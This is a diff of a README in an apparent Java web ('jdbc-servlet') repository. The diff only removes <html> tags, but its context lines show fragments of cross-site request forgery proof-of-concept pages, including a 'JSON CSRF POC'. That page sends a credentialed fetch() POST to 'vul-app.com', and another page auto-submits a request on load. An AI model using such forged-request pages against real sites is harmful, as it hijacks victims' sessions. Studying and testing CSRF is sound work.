@@ -1,6 +1,6 @@
 # jdbc-servlet
 javaweb
-<html>
+
 <head>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 <script>
@@ -16,9 +16,9 @@ $( document ).ready(function() {
 <input type="submit" value="send">
 </form>
 </body>
-</html>
 
-<html>
+
+
 <title>JSON CSRF POC</title>
 <body>
 <center>
@@ -31,9 +31,9 @@ fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'
 </form>
 </center>
 </body>
-</html>
 
-<html>
+
+
   <body>
     <script>
       function submitRequest()
@@ -46,4 +46,4 @@ fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'
       submitRequest();
     </script>
   </body>
-</html>
+
